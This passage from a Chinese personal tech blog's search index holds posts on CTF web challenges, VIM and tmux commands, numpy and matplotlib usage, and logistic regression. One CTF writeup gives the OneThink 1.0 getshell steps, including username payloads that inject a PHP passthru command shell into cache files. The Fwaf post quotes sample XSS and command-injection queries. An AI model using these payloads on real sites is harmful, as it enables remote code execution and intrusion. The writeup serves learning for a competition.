继续调试，发现了使用变量调用函数的地方，并且此处调用了search函数，search函数之中调用了S()函数，终于找到了关键位置 进一步跟进，发现了文件名的处理： 在文件名处理之中，存在一个C()函数，这个函数就是缓存文件名的关键所在，在函数中，$_config[$name]被当做了一个“随机变量”，用于与搜索的关键词组合生成md5。 查看内存中的相应变量的值： 在该变量中储存的随机变量如下，是'sdfdf'的md5码（其实并没有经过md5运算） 最后，全局搜索该md5，发现在config.php文件中就已经赋值好了，算是一个password，可见，本漏洞是已经经过修复的漏洞，只要把密码改掉，想直接得到文件名的概率是极小的： 总结： 查到之前的版本下，缓存漏洞的文件名是直接对传入的文件名进行md5摘要的，而本题的版本已经把它修复了，感觉并不算个漏洞，或者说是已经修复的漏洞。 整个触发流程是： 搜索框搜索-&gt;调用invokeAction函数-&gt;调用搜索函数-&gt;搜索函数内部调用缓存函数-&gt;缓存函数读取缓存密码并拼接md5-&gt;产生文件 但是当时没有改密码的时候还是很容易被打穿的，从被打穿的队伍的网页文件来看，也都是在缓存处出现了问题，可能还有别的漏洞存在。（师傅们应该找到了其他切入点吧） 懒了，先不动了:) 最后，附上源码以供大家玩耍: iseccms源码","categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://hachp1.github.io/tags/Web安全/"}]},{"title":"2018年巅峰极客 Web部分writeup","slug":"巅峰极客writeup","date":"2018-07-23T07:10:57.000Z","updated":"2019-01-24T13:26:54.587Z","comments":true,"path":"posts/Web安全/20180723-Websec.html","link":"","permalink":"http://hachp1.github.io/posts/Web安全/20180723-Websec.html","excerpt":"A simple cms writeup 做此题之前刚好做了一道原题，比赛的时候是做到最后一步的，但是出了差错没有出flag，很气。 首先，打开连接，发现是onethink1.0框架。搜索该框架的漏洞，果然发现了getshell利用过程，原理如下: &gt; 该框架是对thinkphp框架的二次开发，会将注册后的用户名内容存入临时php文件中。 我们使用一句话来作为用户名注册账户，在登录后就将其存入缓存文件，最后访问缓存文件即可完成getshell。 原理比较简单，但是具体利用过程有几个关键点: 1. 注册用户名由于特殊字符不能直接输入进输入框。 2. 存放一句话的临时文件名并不知道。","text":"A simple cms writeup 做此题之前刚好做了一道原题，比赛的时候是做到最后一步的，但是出了差错没有出flag，很气。 首先，打开连接，发现是onethink1.0框架。搜索该框架的漏洞，果然发现了getshell利用过程，原理如下: &gt; 该框架是对thinkphp框架的二次开发，会将注册后的用户名内容存入临时php文件中。 我们使用一句话来作为用户名注册账户，在登录后就将其存入缓存文件，最后访问缓存文件即可完成getshell。 原理比较简单，但是具体利用过程有几个关键点: 1. 注册用户名由于特殊字符不能直接输入进输入框。 2. 存放一句话的临时文件名并不知道。 * 对于问题1，可以通过burp修改包完成。 问题二则需要一定技巧。 首先，使用工具扫描网站路径，发现www.zip文件可以直接下载，解压后发现是onethink打包。此时考虑本地复现，从而解决问题2。 解压至xampp文件夹后，访问本地网页发现并不能成功访问，出现数据库错误字样，这是因为本地数据库没有配置的缘故。此处只能重装onethink来解决。 搜索onethink重装方法，按教程搜索并删除子文件夹中的.lock文件，打开install.php文件，完成安装。 进入注册界面，填入信息后，使用burp拦截并更改，将用户名改为%0a$x=$_GET[a];//（说明：%0a为换行符十六进制，为了在文件中换行，//是注释，将一句话后的无关代码注释掉以正常运行） 用同样的方法注册%0apassthru($x);//用户。 进入登录界面，按顺序依次登入以上两个用户（使用burp改用户名）此时，一句话已写入临时文件中。 使用notepad++文件搜索功能搜索payload，查找到一句话文件所在位置（\\Runtime\\Temponethink_6d11f0be3af9c28d4120c8fd5fe65a40.php和\\Runtime\\Temp\\onethink_d403acece4ebce56a3a4237340fbbe70.php文件都可以） 之后访问一句话，可以执行shell命令，搜索目录后得到flag。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://hachp1.github.io/tags/Web安全/"}]},{"title":"VIM初步","slug":"VIM初步","date":"2018-06-17T11:59:21.000Z","updated":"2019-01-24T13:30:23.411Z","comments":true,"path":"posts/Linux日常/20180617-vim1.html","link":"","permalink":"http://hachp1.github.io/posts/Linux日常/20180617-vim1.html","excerpt":"VIM使用初步 一般指令 查看帮助: help xxx 修改文本指令: 123456789A:到行首第一个非空字符并输入I:到行尾最后一个非空字符并输入c:删除光标所在（后跟其他范围指令表示删除该范围)d:剪切一行x:剪切一个字符dtx :删除所有的内容，直到遇到x号(delete to x)&lt;ctrl + a&gt;:当前数加1&lt;ctrl + x&gt;:当前数减1&lt;ctrl + p\\n&gt;:p:向前补全;n:向后补全。 粘贴模式 set paste","text":"VIM使用初步 一般指令 查看帮助: help xxx 修改文本指令: 123456789A:到行首第一个非空字符并输入I:到行尾最后一个非空字符并输入c:删除光标所在（后跟其他范围指令表示删除该范围)d:剪切一行x:剪切一个字符dtx :删除所有的内容，直到遇到x号(delete to x)&lt;ctrl + a&gt;:当前数加1&lt;ctrl + x&gt;:当前数减1&lt;ctrl + p\\n&gt;:p:向前补全;n:向后补全。 粘贴模式 set paste VIM移动指令： 123456789101112b:光标所在位置的这一个单词首e:光标所在位置的这一个单词尾w:光标所在位置的下一个单词首fx:x为任意字符：在当前行内查找下一个xnfx:第n个字符%:匹配并移动到下一个大中小括号*:匹配并移动到当前光标的下一个单词(相当于 /xxx 之后 n)#:匹配并移动到上一个单词0:移动到行首$:移动到行尾^:行第一个非空g_:行最后一个非空 可视化模式 (参考链接) 12345678910111213141516[ctrl+v]:矩形选择v:字符选择V:行选择对选中的每一行做相应变化:I/A:插入d 删除选中文本c 修改选中文本r 替换选中文本I 在选中文本前插入A 在选中文本后插入gu 选中区域转为小写gU 选中区域转为大写g~ 大小写互调&gt; 向右缩进一个单位&lt; 向左缩进一个单位 宏录制: 12345qa开始(录入进a寄存器)若干操作后q结束@a:使用a寄存器宏@@:使用最新录制的宏","categories":[{"name":"Linux日常","slug":"Linux日常","permalink":"http://hachp1.github.io/categories/Linux日常/"}],"tags":[{"name":"Linux日常","slug":"Linux日常","permalink":"http://hachp1.github.io/tags/Linux日常/"}]},{"title":"matplotlib初步学习","slug":"matplotlib初步学习","date":"2018-06-02T15:04:59.000Z","updated":"2019-01-24T13:30:03.991Z","comments":true,"path":"posts/机器学习/20180602-matplotlib1.html","link":"","permalink":"http://hachp1.github.io/posts/机器学习/20180602-matplotlib1.html","excerpt":"matplotlib学习 使用matplotlib.pylab库画图 matplotlib可以用来作为机器学习可视化的作图工具，在这里简单记录一下常用的一些画图方法。","text":"matplotlib学习 使用matplotlib.pylab库画图 matplotlib可以用来作为机器学习可视化的作图工具，在这里简单记录一下常用的一些画图方法。 1234567891011121314151617181920212223242526272829303132333435363738394041424344plt.figure()后到下一个plt.figure()前为同一张图的操作。 plt.grid(True) #加入网格 plt.plot(x,y) #图形中加入对点(x,y)的观察 plt.figure(num=标题数字,figsize=(长,宽),linewidth=1,linestyle=’--’,c=’red’) plot.xlim((1,2)) plot.ylim((3,4))#横纵坐标范围plt.xlabel('x axis label') plt.ylabel('y axis label') figure(figsize=(8,6),dpi=80) #创建一个长宽为8*6的图，设置分辨率为80 subplot(2,3,n)创建一个2*3的网格图，接下来的图样会在其第n块显示 savefig(“1.jpg”,dpi=80) #存图 plt.ytick([-2,-1,0,1], [‘bad2’,’bad1’,’ok’,’good’]) #对坐标打标记 画图时构造x、y序列：x=np.array([i/10.0 for i in range(-50,50,1)])x=np.array([i for i in range(-10,10,1)])x=linspace(-10,10,1000)* 折线图 plt.plot(X,Y) 直接描点为折线图,当点数足够多时，折线会成为曲线。 配合使用linspace画图： x=linspace(-5,5,50); #生成一维点 y=x**2; #输入公式 plot.plot(x ,y) #画图 * 散点图 plt.scatter(X,Y,s=75,c=函数,alpha=0.5) s:size c:color（或直接写color，可以不用管IDE显示红色的情况，内部有color属性） alpha:透明度 * 柱状图 plt.bar(X,Y，facecolor=””,edgecolor=’white’) * 等高线图 用于三维数据 plt.contourf(X,Y,f(X,Y),8,alpha=0.75,cmap=plt.cm.hot)'''8:等高线数 f(X,Y):高度（X,Y的映射值）,alpha:透明度,cmap:colormap,颜色映射类型（样式） plt.clabel(C,inline=True,fontsize=10) 其中C为实例，使用 C= plt.contourf(X,Y,f(X,Y),8,alpha=0.75,cmap=plt.cm.hot)获取注意：f(X,Y)必须为长方形矩阵（内部代码实现），所以需要映射一定量的长方形布局的点再计算其值''' 使用等高线画决策边界 123456x1_min, x1_max = x_test[:, 0].min() - 1, x_test_de[:, 0].max() + 1x2_min, x2_max = x_test[:, 1].min() - 1, x_test_de[:, 1].max() + 1xx1, xx2 = np.meshgrid(np.arange(x1_min, x1_max, 0.01), np.arange(x2_min, x2_max, 0.01))Z = classifier.predict(mypca.inverse_transform(np.array([xx1.ravel(), xx2.ravel()]).T))Z = Z.reshape(xx1.shape)plt.contourf(xx1, xx2, Z, alpha=0.4, cmap=cmap) 点颜色映射 1234567from matplotlib.colors import ListedColormap...colors = ('red', 'blue', 'lightgreen', 'gray', 'cyan')cmap = ListedColormap(colors[:len(np.unique(y))])for idx, cl in enumerate(np.unique(y)): plt.scatter(x=X[y == cl, 0], y=X[y == cl, 1], alpha=0.8, c=cmap(idx), label=cl) 三维图的创建 123456789101112131415161718from mpl_toolkits.mplot3d import Axes3Dimport itertools...fig = plt.figure()ax = fig.add_subplot(111, projection='3d')'''A = XB = YZ = np.array(Z)'''Z = Z.flatten()C = np.array([i for i in itertools.product(A, B)])A = C[:, 0]B = C[:, 1]ax.plot_trisurf(A, B, Z, cmap='rainbow')plt.show() 图像填色 12345678910'''填充与坐标轴之间的图形'''plt.fill(x, y, color = \"g\", alpha = 0.3)'''填充两曲线之间的空间'''plt.fill_between(x, y1, y2, facecolor = \"yellow\")plt.fill_between(x, y1, y2, where= y1 &gt;= y2, facecolor = \"blue\", interpolate= True)plt.fill_between(x, y1, y2, where= y2 &gt; y1, facecolor = \"yellow\", interpolate= True)","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习初步","slug":"机器学习初步","permalink":"http://hachp1.github.io/tags/机器学习初步/"}]},{"title":"杂·sklearn 保存训练结果","slug":"杂·SKlearn训练结果保存","date":"2018-05-05T09:23:18.000Z","updated":"2019-01-24T13:30:44.733Z","comments":true,"path":"posts/机器学习/20180505-dump.html","link":"","permalink":"http://hachp1.github.io/posts/机器学习/20180505-dump.html","excerpt":"一、使用joblib保存结果 代码如下： 123456789from sklearn.externals import joblib#此处假设已训练好的模型为learnClassifier#保存训练模型joblib.dump(learnClassifier, 'learnClassifier.model')#载入训练模型learnClassifier = joblib.load('learnClassifier.model')","text":"一、使用joblib保存结果 代码如下： 123456789from sklearn.externals import joblib#此处假设已训练好的模型为learnClassifier#保存训练模型joblib.dump(learnClassifier, 'learnClassifier.model')#载入训练模型learnClassifier = joblib.load('learnClassifier.model') 二、使用pickle保存结果 与joblib相比，pickle实际上是序列化和反序列化的函数。 注：pickle函数加s表示在bytes层面（程序变量中）的操作，而不加s的则是对文件的操作。 代码如下： 1234567#保存训练模型dump=pickle.dumps(classifier)with open(&apos;classifier_dump.pickle&apos;,&apos;w&apos;) as f: f.write(dump)#载入训练模型with open(&apos;classifier_dump.pickle&apos;,&apos;r&apos;) as f: classifier=pickle.load(f.read())","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://hachp1.github.io/tags/机器学习/"}]},{"title":"对逻辑回归的进一步理解","slug":"对逻辑回归的进一步理解","date":"2018-04-11T14:32:52.000Z","updated":"2019-01-24T13:31:17.539Z","comments":true,"path":"posts/机器学习/20180411-logistic.html","link":"","permalink":"http://hachp1.github.io/posts/机器学习/20180411-logistic.html","excerpt":"概要 逻辑回归即使用一个超平面将整个空间一分为二，并且在边界附近赋予连续（即不是非黑即白，而是可以有0-1之间的小数概率）的概率估计的二分类方法。 逻辑回归使用\\(θX\\)作为划分数据的边界。 逻辑回归使用 \\[ g( Z) =\\frac{1}{1+e^{Z}} \\] 替代离散的分布函数，其中，g(Z)即概率统计中的分布函数，可根据极大似然估计得到使用已有样本点估计的近似值：从理论上来讲，此时的似然函数应该是最大的，可以用梯度上升法求之。","text":"概要 逻辑回归即使用一个超平面将整个空间一分为二，并且在边界附近赋予连续（即不是非黑即白，而是可以有0-1之间的小数概率）的概率估计的二分类方法。 逻辑回归使用\\(θX\\)作为划分数据的边界。 逻辑回归使用 \\[ g( Z) =\\frac{1}{1+e^{Z}} \\] 替代离散的分布函数，其中，g(Z)即概率统计中的分布函数，可根据极大似然估计得到使用已有样本点估计的近似值：从理论上来讲，此时的似然函数应该是最大的，可以用梯度上升法求之。 对边界的理解 --- 显然，Z=θX这个“超平面”可以作为划分整个空间的依据。本来到这里就可以用分段函数完成估计了，但是（1）分布函数是离散的，（2）并且不利于计算靠近分界时的概率，所以引入了S函数使分布函数连续化且能估计在边界附近的概率值，一举两得。 对代价函数的证明与理解 在证明的时候，本来是要分别讨论y=1和y=0时的分布函数的，在得出代价函数的时候使用了一个技巧统一了公式 我们知道，在实际情况下的点为\\((y_{i},X_{i})\\)，而\\(y_i\\)只能为0或1,所以有如下讨论： \\[h(X)=p(y=1|X_{i},θ)\\] 显然，只有以上这个等式我们并不能用到y=0的点，所以有如下公式： \\[1-h(X)=p(y=0|X_{i},θ)\\] 二者相乘后就得到了统一后的结果： \\[ h(X_{i})^{y_{i}}*(1-h(X_{i})^{1-y_{i}}=p(y_{i}|X_{i},θ) \\] 我们的目的就是要使以上式子最大化（极大似然的原理：我们观测到的一组数据是n个相互独立的随机变量的观测值，将它们出现的概率乘起来即得到整个观测值出现的概率，而我们观测到的现象一定是出现概率最大的那个结果，所以带入数据后整个式子的值最大）。 接下来就是熟悉的极大似然估计的步骤了，由极大似然估计法要将其最大化，利用高数知识，函数取对数后求导，令导数为零可以解出θ值(而在计算机中则使用梯度上升等方法得到结果） 对其取对数可得逻辑回归的代价函数（与其他回归的代价函数类似，但此处因为是极大似然估计，是求其最大值） \\[ L(θ)=-\\frac{1}{m}[\\sum_{i-1}^{m}y^{i}logh_{θ}(x^{i}+(1-y^{i})log(1-h_{θ}(x^{i}))] \\] 接下来就是手工求导出公式并使用梯度下降等算法了，可以愉快的逻辑回归了:) 对\\(θ_{i}\\)求偏导： \\[ \\frac{\\partial}{\\partial{θ_{i}} }L(θ)=(y-h(x))x_{i} \\] 梯度上升: \\[ θ_{i}=θ_{i}+α(y-h(x))x_{i} \\] 贴上手写的浮肿的代码（文件已传github）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899import numpy as npimport matplotlib.pylab as plotclass Logistic: ''' 特征系数θ ''' theta = np.zeros((1, 1)) ''' 梯度上升循环次数 ''' cycleNum = 10000 ''' 特征向量X、标记向量y ''' X = np.zeros((1, 1)) Y = np.zeros((1, 1)) alpha = 1 def z(self, X): # z函数，决定z函数的形式 注：这里的X是向量不是矩阵 return X.dot(self.theta.transpose()) def h(self, x): return 1.0 / (1 + np.exp(-self.z(x))) def fit(self, X, Y): cx=np.ones((X.shape[0],1)) self.X = np.c_[cx,X] self.Y = Y self.theta = np.random.random((1, self.X.shape[1])) # 由于theta使用random函数导致其为二维而不是一维。 i = 0 j = 0 while j &lt; self.cycleNum: dtheta = np.zeros((1, self.X.shape[1])) # print(self.theta) # print(self.theta[0][0] / self.theta[0][1]) while i &lt;= self.Y.shape[0] - 1: dtheta += (self.Y[i] - self.h(self.X[i])) * self.X[i] i += 1 i = 0 # 初始化i self.theta = self.theta + self.alpha * dtheta j += 1 def predict(self, vX): output = self.h(vX) if output &lt; 0.5: return 0 else: return 1if __name__ == '__main__': lineSplit = [] x_train = [] y_train = [] with open(\"testSet-LR.txt\", 'r') as f: lines = f.readlines() for line in lines: lineSplit = (line.strip().split()) x_train.append([float(lineSplit[0]), float(lineSplit[1])]) y_train.append([int(lineSplit[2])]) x_train = np.array(x_train) y_train = np.array(y_train) logis = Logistic() logis.alpha = 100 logis.cycleNum = 30000 logis.fit(x_train, y_train) xop = [] yop = [] xpe = [] ype = [] i = 0 while i &lt;= x_train.shape[0] - 1: if y_train[i] == 1: xop.append(x_train[i][0]) yop.append(x_train[i][1]) else: xpe.append(x_train[i][0]) ype.append(x_train[i][1]) i += 1 fig=plot.figure() plot.scatter(xop, yop, color=\"red\") plot.scatter(xpe, ype, color=\"blue\") plot.xlim((-10,20 )) plot.ylim((-10, 20)) X = np.linspace(-10, 10, 30) Y = -X * logis.theta[0][1] / logis.theta[0][2] - logis.theta[0][0] / logis.theta[0][2] plot.plot(X, Y) plot.show() fig.savefig('lr.jpg') 参考资料：用最大似然估计求逻辑回归参数","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://hachp1.github.io/tags/机器学习/"}]},{"title":"numpy数组常用处理函数","slug":"numpy数组常用处理函数","date":"2018-04-09T14:32:52.000Z","updated":"2019-01-24T13:26:20.389Z","comments":true,"path":"posts/机器学习/20180409-numpy.html","link":"","permalink":"http://hachp1.github.io/posts/机器学习/20180409-numpy.html","excerpt":"numpy数组常用处理函数 numpy 数组是python机器学习常用的数据结构，在这里简单记下常见的使用方法和一些初学时遇到的问题 注意事项 使用数组时不要犯低级错误，注意行数和列数，不要搞反了。 np.array转化宽度不一致的数组时会出现未知错误，使用时要谨慎。 numpy使用元组作为引用，容易和多维数组按层拆分搞混，多维数组不支持元组索引（numpy也支持按层拆分）如：a[1,2]和b[1][2]。 注意矩阵乘法转置。 注意numpy不是默认二维数组， 若矩阵为向量，则只有shape[0](即向量长度为shape[0]而不是它作为矩阵时的shape[1]): [1,2,3,4] 看作矩阵： shape:[1,4] 看作向量：shape:[4] 在维度不匹配的时候可以加上shape先判断。 矩阵第一个参数为行数，第二个为列数...申请空白2维矩阵:(0,2) 添加新行： np.append(red,[vx],axis=0)此处的vx必须升维到与大矩阵相同，axis表示添加一行 或yellow=np.r_[yellow,[vx]]，道理同上","text":"numpy数组常用处理函数 numpy 数组是python机器学习常用的数据结构，在这里简单记下常见的使用方法和一些初学时遇到的问题 注意事项 使用数组时不要犯低级错误，注意行数和列数，不要搞反了。 np.array转化宽度不一致的数组时会出现未知错误，使用时要谨慎。 numpy使用元组作为引用，容易和多维数组按层拆分搞混，多维数组不支持元组索引（numpy也支持按层拆分）如：a[1,2]和b[1][2]。 注意矩阵乘法转置。 注意numpy不是默认二维数组， 若矩阵为向量，则只有shape[0](即向量长度为shape[0]而不是它作为矩阵时的shape[1]): [1,2,3,4] 看作矩阵： shape:[1,4] 看作向量：shape:[4] 在维度不匹配的时候可以加上shape先判断。 矩阵第一个参数为行数，第二个为列数...申请空白2维矩阵:(0,2) 添加新行： np.append(red,[vx],axis=0)此处的vx必须升维到与大矩阵相同，axis表示添加一行 或yellow=np.r_[yellow,[vx]]，道理同上 python代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115a = [1,2,3] b = [4,5,6] c = [4,5,6,7,8] zipped = zip(a,b) # 打包为元组的列表 [(1, 4), (2, 5), (3, 6)] zip(a,c) # 元素个数与最短的列表一致 [(1, 4), (2, 5), (3, 6)] zip(*zipped) # 与 zip 相反，可理解为解压，返回二维矩阵式 [(1, 2, 3), (4, 5, 6)]X=np.array([[1,2,3][4,5,6]])a=np.arange(9).reshape(3,3)aOut[31]: array([[0, 1, 2], [3, 4, 5], [6, 7, 8]])'''注意，由于数组可以为高维，所以在此处需要用元组来包裹其尺寸。'''Z0 = np.zeros((2,2)) # Create an array of all zerosprint Z0 # Prints \"[[ 0. 0.] # [ 0. 0.]]\" z1=np.empty((2,))b = np.ones((1,2)) # Create an array of all onesprint b # Prints \"[[ 1. 1.]]\"c = np.full((2,2), 7) # Create a constant arrayprint c # Prints \"[[ 7. 7.] # [ 7. 7.]]\"I = np.eye(2) # Create a 2x2 identity matrixprint I # Prints \"[[ 1. 0.] # [ 0. 1.]]\"e = np.random.random((2,2)) # Create an array filled with random valuesprint e # Might print \"[[ 0.91940167 0.08143941]# [ 0.68744134 0.87236687]]\"扩展矩阵函数tile()np.tile(a,(m,n))&gt;&gt;&gt;x=np.array([0,0,0])&gt;&gt;&gt; x[[0, 0, 0]]&gt;&gt;&gt; tile(x,(3,1)) #即将x扩展3个，j=1,表示其列数不变matrix([[0, 0, 0], [0, 0, 0], [0, 0, 0]])&gt;&gt;&gt; tile(x,(2,2)) #x扩展2次，j=2,横向扩展matrix([[0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0]])'''矩阵合并函数'''hstack : Stack arrays in sequence horizontally (column wise).vstack : Stack arrays in sequence vertically (row wise).dstack : Stack arrays in sequence depth wise (along third axis).concatenate : Join a sequence of arrays together.r_ : Translates slice objects to concatenation along the first axis.c_ : Translates slice objects to concatenation along the second axis.'''使用np.c_[]和np.r_[]分别添加行和列注：该方法只能将两个矩阵合并，不会改变原矩阵的维度'''np.c_[a,b]'''将b以列的形式拼接至a的后面'''### 推荐用法：newarray=numpy.insert(arr, obj, values, axis=None) '''arr：被插入的矩阵obj：要被插入的行（列）位置，将会插入到它的前一行（列）values：插入值（矩阵）axis：轴值，若未填入则矩阵会被展开,为0则插入行，1则插入列。'''array([[0, 1, 2], [3, 4, 5], [6, 7, 8]])'''取矩阵的某一行'''a[1]Out[32]: array([3, 4, 5])'''取矩阵的某一列'''a[:,1]Out[33]: array([1, 4, 7])a.reshape(3, 4, -1)a.T # 转置a.transpose() # 转置numpy.linalg.inv(a) # 求逆a.diagonal([offset, axis1, axis2]) # 对角元np.linalg.norm(np_c1 - np_c2) #计算点c1和c2之间的欧式距离（一个点为一行）numpy.linspace(start, stop, num=50, endpoint=True, retstep=False, dtype=None)# 返回均匀相隔的一组数据(num个)：Out:[start,start+step…] 对数据点按标记值创建分类组 12345678910import numpy as np # 注：必须要numpy才能成功x = np.array([1, 2, 3, 4])y = np.array([1, 0, 0, 2])test = x[y == 0]print(test)'''输出：[2 3]''' shuffle_data函数（对整个数据集进行洗牌，但x与y绑定） 123456789101112import numpy as np def shuffle_data(train_data, train_target): batch_size= len(train_target) index = [i for i in range(0, batch_size)] np.random.shuffle(index) batch_data = [] batch_target = [] for i in range(0, batch_size): batch_data.append(train_data[index[i]]) batch_target.append(train_target[index[i]]) return batch_data, batch_target 填充 1234567891011121314151617181920212223242526272829303132333435# 直接用lenth=10a=np.array([[6,6], [6,6]])a=np.pad(a,((0,0),(0,lenth-a.shape[1])), 'constant', constant_values=0)'''[[6 6 0 0 0 0 0 0 0 0] [6 6 0 0 0 0 0 0 0 0]]'''# 其他详细操作a=np.array([[6,6], [6,6]])b=np.pad(a,((1,2),(3,4)), 'constant', constant_values=(0, 1))print(b)'''[[0 0 0 0 0 1 1 1 1] [0 0 0 6 6 1 1 1 1] [0 0 0 6 6 1 1 1 1] [0 0 0 1 1 1 1 1 1] [0 0 0 1 1 1 1 1 1]]'''a=np.array([[6,6], [6,6]])b=np.pad(a,((0,0),(0,4)), 'constant', constant_values=( 0))print(b)'''[[6 6 0 0 0 0] [6 6 0 0 0 0]]''' 二进制保存 1234567m=np.array(n)m.tofile('test/m.bin')...m=fromfile('test/m.bin',dtype=np.float).reshape(-1,x,x)np.save('test/m.npy',m)m=np.load('test/m.npy')","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习初步","slug":"机器学习初步","permalink":"http://hachp1.github.io/tags/机器学习初步/"}]},{"title":"Fwaf短源码学习","slug":"Fwaf短源码学习","date":"2018-04-08T12:23:59.000Z","updated":"2019-01-24T13:31:30.924Z","comments":true,"path":"posts/机器学习/20180408-ml.html","link":"","permalink":"http://hachp1.github.io/posts/机器学习/20180408-ml.html","excerpt":"Fwaf Fwaf是GitHub上的一个机器学习Web恶意请求防火墙，代码比较简洁，思路也比较清晰，由于和自己的某个想法很契合，就稍作分析。 库的使用和特征化 Fwaf使用sklearn库训练样本集。 其中，使用TfidfVectorizer对字符串进行特征化。 TfidfVectorizer TF-IDF（term frequency–inverse document frequency）是一种用于资讯检索与文本挖掘的常用加权技术。TF-IDF是一种统计方法，用以评估一字词对于一个文件集或一个语料库中的其中一份文件的重要程度。字词的重要性随着它在文件中出现的次数成正比增加，但同时会随着它在语料库中出现的频率成反比下降。TF-IDF加权的各种形式常被搜索引擎应用，作为文件与用户查询之间相关程度的度量或评级。除了TF-IDF以外，互联网上的搜索引擎还会使用基于连结分析的评级方法，以确定文件在搜寻结果中出现的顺序。","text":"Fwaf Fwaf是GitHub上的一个机器学习Web恶意请求防火墙，代码比较简洁，思路也比较清晰，由于和自己的某个想法很契合，就稍作分析。 库的使用和特征化 Fwaf使用sklearn库训练样本集。 其中，使用TfidfVectorizer对字符串进行特征化。 TfidfVectorizer TF-IDF（term frequency–inverse document frequency）是一种用于资讯检索与文本挖掘的常用加权技术。TF-IDF是一种统计方法，用以评估一字词对于一个文件集或一个语料库中的其中一份文件的重要程度。字词的重要性随着它在文件中出现的次数成正比增加，但同时会随着它在语料库中出现的频率成反比下降。TF-IDF加权的各种形式常被搜索引擎应用，作为文件与用户查询之间相关程度的度量或评级。除了TF-IDF以外，互联网上的搜索引擎还会使用基于连结分析的评级方法，以确定文件在搜寻结果中出现的顺序。 * TF: Term Frequency \\[ TF(t)=\\frac{n(character(i))}{n(character)} \\] IDF: 逆向文件频率，用于衡量一个词的重要性 \\[ ID(t) = log_e(\\frac{numOfDocs}{numOfDocsWhichIncludeT}) \\] \\[ TF-IDF = TF*IDF \\] sklearn.feature_extraction.text.TfidfVectorizer：可以将文档转换成TF-IDF特征的矩阵。 ngram_range：词组切分的长度范围。该范围之内的n元feature都会被提取出来，这个参数要根据自己的需求调整。 1vectorizer = TfidfVectorizer(min_df = 0.0, analyzer=\"char\", sublinear_tf=True, ngram_range=(1,3)) 样本集 作者使用txt格式的样本集，每一行为一个样本，分&quot;goodqueries.txt&quot;和&quot;badqueries.txt&quot;。 截取几行： 123/top.php?stuff='uname &gt;q36497765 #/h21y8w52.nsf?&lt;script&gt;cross_site_scripting.nasl&lt;/script&gt;/ca000001.pl?action=showcart&amp;hop=\\\"&gt;&lt;script&gt;alert('vulnerable') 机器学习算法 作者使用逻辑回归算法，算法虽然简单，但效果还比较好:) 比较适合刚写机器学习代码不久的我:) 1lgs = LogisticRegression(class_weight=&#123;1: 2 * validCount / badCount, 0: 1.0&#125;) 1234Accuracy: 0.999420Precision: 0.984403Recall: 0.998520F1-Score: 0.991411 各项指标都很高啊2333 贴上作者源代码： 源代码链接：Fwaf-Machine-Learning-driven-Web-Application-Firewall","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://hachp1.github.io/tags/机器学习/"}]},{"title":"terminal和VIM的分屏简单命令","slug":"terminal和VIM的分屏简单命令","date":"2018-04-06T14:05:33.813Z","updated":"2019-01-24T13:30:34.210Z","comments":true,"path":"posts/Linux日常/20180406-vim&t.html","link":"","permalink":"http://hachp1.github.io/posts/Linux日常/20180406-vim&t.html","excerpt":"Linux下的分屏 在远程登陆Linux时，要远程启动多个程序，分屏显得很重要。 在这里小记一下几种简单的分屏命令。 1、terminal分屏 使用tmux对terminal分屏，常用指令如下： 开启tmux：在terminal中输入tmux开启分屏。 tmux ls： 显示已有的tmux会话 tmux attach-session -t 数字： 选择tmux tmux kill-session -t session-name：关闭tmux 开启鼠标移动、调节窗口大小等功能：[ctrl]+b+:后输入 set -g mouse on","text":"Linux下的分屏 在远程登陆Linux时，要远程启动多个程序，分屏显得很重要。 在这里小记一下几种简单的分屏命令。 1、terminal分屏 使用tmux对terminal分屏，常用指令如下： 开启tmux：在terminal中输入tmux开启分屏。 tmux ls： 显示已有的tmux会话 tmux attach-session -t 数字： 选择tmux tmux kill-session -t session-name：关闭tmux 开启鼠标移动、调节窗口大小等功能：[ctrl]+b+:后输入 set -g mouse on [ctrl+b]为tmux的指令输入前缀，以下指令为输入前缀指令后的指令： 上下分屏：&quot; 左右分屏: % 切换屏幕：o 关闭一个终端：x 上下分屏与左右分屏切换：空格键 还可以调整分屏大小（平均化） 显示快捷键帮助：？ 移动到下一个窗口：n 貌似比较鸡肋 显示时钟：t （ps：显示效果还可以） 临时退出session: d 列出session：tmux ls （不用前缀） 进入已存在的session：tmux a -t $session_name 关闭并删除所有session:[：]+ kill-server 复制模式 : [ 空格标记复制开始，回车结束复制。 粘贴 ：] 2、VIM分屏 载入文件 在新的垂直分屏中打开文件:vs 文件路径/文件名 在新的水平分屏中打开文件:sv 文件路径/文件名 与tmux类似，[ctrl+w]为VIM的指令输入前缀，以下指令为输入指令前缀后的指令： 下一个分屏：w 上一个分屏：p 使用 hjkl选择分屏 新建分屏：n（new）貌似比较鸡肋 水平分屏：s（split）貌似也比较鸡肋 垂直分屏：v（vsplit) 还是比较鸡肋 关闭分屏：c（close）或者直接命令模式 :q 具体还有其他指令，不会再查，感觉够用了，懒得记:)","categories":[{"name":"Linux日常","slug":"Linux日常","permalink":"http://hachp1.github.io/categories/Linux日常/"}],"tags":[{"name":"Linux日常","slug":"Linux日常","permalink":"http://hachp1.github.io/tags/Linux日常/"}]},{"title":"林轩田机器学习基石 